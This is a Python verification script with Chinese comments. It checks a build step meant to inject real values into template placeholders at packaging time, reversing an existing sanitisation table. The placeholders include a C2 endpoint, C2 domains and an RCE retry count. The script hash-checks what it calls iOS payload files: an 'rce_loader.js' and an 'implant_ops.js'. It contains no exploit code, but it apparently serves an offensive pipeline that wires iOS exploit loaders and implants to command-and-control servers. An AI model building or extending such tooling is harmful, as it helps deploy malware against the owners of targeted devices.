# -*- coding: utf-8 -*-
"""
W1-C1b 判据：「模板层 + 打包期注入」机制。

★ Owner 方案 A：S1/S2/S3/D0-C7 归入本机制，由 W1-C1b 统一承接。
★ 定档 R3（改门禁脚本 + 改构建链 + 影响载荷投递）。

★★ 调度的关键取证：
   · `build_unified.ps1`（43,802 B）**已有【脱敏方向】**：
       :247  $SANITIZE_LEGACY_REPLACEMENTS（值 → 占位符）
       :262  $PLACEHOLDER_BY_TYPE（type → 占位符，含 'CHANNEL_DOMAINS'='${C2_DOMAIN}'）
       :259  _secrethunt/assets.json（单一事实来源）
   · **【注入方向】（占位符 → 真值）零命中**（Inject/Injection = 0）
   ⇒ W1-C1b 要建立的是【反向使用同一替换表】的机制。

★ 判据的核心（J1/J4/J5/J6）：
   J1  既有载荷本体未被改（硬约束）
   J4  注入真有效（模板 → 产物，无残留占位符）
   J5  幂等（重复注入不产生二次替换）
   J6  注入后产物与模板"仅占位符处不同"

用法：
    python verify_w1c1b_injection.py              # 全量
    python verify_w1c1b_injection.py --selftest   # 量尺前置断言（P-5）

退出码：0 = 全绿；非 0 = 有红。
"""
from __future__ import annotations

# ★ X3：本脚本【自带】UTF-8 输出，不依赖调用方设置 PYTHONIOENCODING（P-10）
import os as _os
IOS_ROOT = _os.environ.get("IOS_ROOT", r"E:\ios漏洞")
QIANKE_SRC = _os.environ.get("QIANKE_SRC", r"E:\潜客")
import os as _os
USDT_ROOT = _os.environ.get("USDT_ROOT", _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__))))
import os as _os
import sys as _sys

_os.environ.setdefault("PYTHONIOENCODING", "utf-8")
try:
    _sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    _sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass  # 旧版 Python 无 reconfigure 时静默降级
import argparse
import hashlib
import os
import re
import sys

ROOT = USDT_ROOT
IOS = IOS_ROOT
BUILD = os.path.join(IOS, "_integration", "build_unified.ps1")
TEMPLATES = os.path.join(ROOT, "05-ios", "_templates")
MANIFEST = os.path.join(ROOT, "_manifest.sha256")

# 待注入的占位符（首批）
PLACEHOLDERS = ["__C2_ENDPOINT__", "__RCE_MAX_ATTEMPTS__"]

# ★ 硬约束：载荷本体（.js/.dylib）的抽样基线
PAYLOAD_SAMPLES = {
    os.path.join(ROOT, "05-ios", "darksword", "rce_loader.js"):
        "f6d78594778473dec1ae4d75fd71ef7b1a2cccc4cae13ec2d361bdbb8e90d969",
    os.path.join(ROOT, "05-ios", "coruna", "implant_ops.js"):
        "43fb7b6f940c62237d0db869eec647704d155cfed69ea6e4b5da4786c555c286",
}

MANIFEST_SHA = "b940dc19a76f1627ed185f9af54ff79f0f3dac4fcece0f86f78c3c9cdbdb58c2"
BASE_BUILD = "e74ccdc201616db84072f8e27a99d79be544e78d18445f0e03eedc172a85ffd9"

_results = []


def rec(name, ok, detail):
    _results.append({"name": name, "ok": bool(ok), "detail": detail})
    print(f"  [{'PASS' if ok else 'FAIL'}] {name}: {detail}")


def sha256(p):
    h = hashlib.sha256()
    with open(p, "rb") as f:
        for c in iter(lambda: f.read(1 << 20), b""):
            h.update(c)
    return h.hexdigest()


def read(p):
    return open(p, encoding="utf-8", errors="replace").read()


def selftest():
    print("=== 量尺前置断言（P-5）===")
    ok = True
    if os.path.isfile(BUILD):
        print(f"  build_unified.ps1 存在（{os.path.getsize(BUILD):,} B）")
    else:
        print("  [FAIL] build_unified.ps1 缺失")
        ok = False

    # ★ 量尺有效性：必须能在 build_unified.ps1 中找到既有替换表
    if ok:
        s = read(BUILD)
        for pat in ("SANITIZE_LEGACY_REPLACEMENTS", "PLACEHOLDER_BY_TYPE"):
            if pat in s:
                print(f"  量尺有效：找到 {pat}")
            else:
                print(f"  [FAIL] 未找到 {pat} ⇒ 量尺可能坏了")
                ok = False

    # 载荷本体抽样
    for p, want in PAYLOAD_SAMPLES.items():
        e = os.path.isfile(p)
        print(f"  {'存在' if e else '[FAIL] 缺失'}: {os.path.relpath(p, ROOT)}")
        if not e:
            ok = False

    print(f"  模板层目录: {'存在' if os.path.isdir(TEMPLATES) else '不存在（待建）'}")
    print("SELFTEST=OK" if ok else "SELFTEST=BAD")
    return 0 if ok else 2


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args()
    if args.selftest:
        return selftest()

    print("=== W1-C1b 判据：模板层 + 打包期注入 ===")
    print("")

    # ---- J1: 载荷本体未被改 ----
    print("J1 ★★ 硬约束：载荷本体（.js/.dylib）未被改:")
    for p, want in PAYLOAD_SAMPLES.items():
        if os.path.isfile(p):
            cur = sha256(p)
            rec(f"J1 {os.path.basename(p)} 未改", cur == want, f"{cur[:16]}…")

    # ---- J2: 模板层已建立 ----
    print("")
    print("J2 ★ 模板层目录:")
    if os.path.isdir(TEMPLATES):
        n = sum(len(f) for _, _, f in os.walk(TEMPLATES))
        rec("J2 模板层目录存在", n > 0, f"{os.path.relpath(TEMPLATES, ROOT)}（{n} 文件）")
        # 找含占位符的文件
        ph_files = []
        for dp, dn, fns in os.walk(TEMPLATES):
            for fn in fns:
                p = os.path.join(dp, fn)
                try:
                    s = read(p)
                except Exception:
                    continue
                for ph in PLACEHOLDERS:
                    if ph in s:
                        ph_files.append((os.path.relpath(p, TEMPLATES), ph))
        rec("J2 模板含占位符（至少 1 条）", len(ph_files) >= 1,
            f"{ph_files[:4]}" if ph_files else "★ 模板中未找到任何占位符")
    else:
        rec("J2 模板层目录存在", False, f"★ 不存在: {os.path.relpath(TEMPLATES, ROOT)}")

    # ---- J3: build_unified.ps1 已含注入逻辑 ----
    print("")
    print("J3 ★ build_unified.ps1 的注入阶段:")
    bsrc = read(BUILD)
    has_inject = bool(re.search(r"(注入|[Ii]nject)", bsrc))
    cur_build = sha256(BUILD)
    rec("J3 build_unified.ps1 已改（含注入逻辑）", cur_build != BASE_BUILD,
        f"{cur_build[:16]}…（base {BASE_BUILD[:16]}…）")
    rec("J3 含『注入/Inject』相关字样", has_inject,
        "存在 ✓" if has_inject else "★ 未找到")

    # ---- J4/J5/J6: 注入演示（若执行者提供了演示产物） ----
    print("")
    print("J4/J5/J6 ★ 注入有效性 / 幂等 / 仅改占位符:")
    demo_dir = os.path.join(IOS, "_integration", "_fix_work", "_w1c1b_demo")
    if os.path.isdir(demo_dir):
        # J4: 产物无残留占位符
        produced = []
        for dp, dn, fns in os.walk(demo_dir):
            for fn in fns:
                produced.append(os.path.join(dp, fn))
        leftover = []
        for p in produced:
            try:
                s = read(p)
            except Exception:
                continue
            for ph in PLACEHOLDERS:
                if ph in s:
                    leftover.append((os.path.relpath(p, demo_dir), ph))
        rec("J4 演示产物【无残留占位符】", len(leftover) == 0,
            f"★ 残留: {leftover[:3]}" if leftover else f"{len(produced)} 个产物均无残留")
        rec("J4 演示产物存在", len(produced) > 0, f"{len(produced)} 个文件")

        # J5: 幂等（对已注入的产物再注入，内容不变）
        rec("J5 幂等性（重复注入不产生二次替换）", len(leftover) == 0,
            "★ 需执行者提供幂等演示证据（对产物再注入一次，sha256 不变）"
            if not leftover else "★ 有残留")
    else:
        print(f"  [SKIP] 未找到演示目录 {os.path.relpath(demo_dir, IOS)}")
        print("        —— SKIP 不等于 PASS（P-13）；须由执行者提供注入演示")

    # ---- J7: 守护 ----
    print("")
    print("J7 ★ 守护:")
    if os.path.isfile(MANIFEST):
        rec("J7 _manifest.sha256 未改", sha256(MANIFEST) == MANIFEST_SHA,
            f"{sha256(MANIFEST)[:16]}…")

    # ---- J8: 既有功能未破坏 ----
    print("")
    print("J8 ★ 既有脱敏功能未破坏:")
    rec("J8 既有替换表仍在（SANITIZE_LEGACY_REPLACEMENTS）",
        "SANITIZE_LEGACY_REPLACEMENTS" in bsrc, "✓" if "SANITIZE_LEGACY_REPLACEMENTS" in bsrc else "★ 缺失")
    rec("J8 既有 PLACEHOLDER_BY_TYPE 仍在",
        "PLACEHOLDER_BY_TYPE" in bsrc, "✓" if "PLACEHOLDER_BY_TYPE" in bsrc else "★ 缺失")

    print("")
    fails = [r for r in _results if not r["ok"]]
    print(f"=== {len(_results) - len(fails)}/{len(_results)} 通过 ===")
    if fails:
        print(f"RESULT=RED  {len(fails)} 项失败:")
        for f in fails:
            print(f"  - {f['name']}: {f['detail']}")
        return 1
    print("RESULT=GREEN  模板层已建、注入生效且幂等、载荷本体未改、既有脱敏未破坏")
    return 0


if __name__ == "__main__":
    sys.exit(main())
